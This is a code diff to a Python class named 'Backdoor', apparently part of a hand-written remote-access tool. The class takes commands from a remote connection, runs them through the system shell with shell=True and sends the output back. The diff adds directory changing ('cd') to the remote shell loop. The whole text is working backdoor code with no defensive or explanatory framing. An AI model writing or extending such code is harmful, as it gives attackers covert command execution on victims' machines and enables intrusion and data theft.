@@ -2,6 +2,7 @@
 import socket 
 import json
 import subprocess
+import os
 
 class Backdoor:
     def __init__(self,ip,port):
@@ -24,13 +25,20 @@ class Backdoor:
     def execute_commands(self,command):
         return subprocess.check_output(command,shell=True)
 
+    def change_working_directory(self,path):
+        os.chdir(path)
+        return "[+] Changing working directory to" + path
+
     def Run(self):
         while(True):
             command = self.reliable_recieve()
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-            command_result = self.execute_commands(command)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory(command[1])
+            else:
+                command_result = self.execute_commands(command)
             self.reliable_send(command_result)
         
 
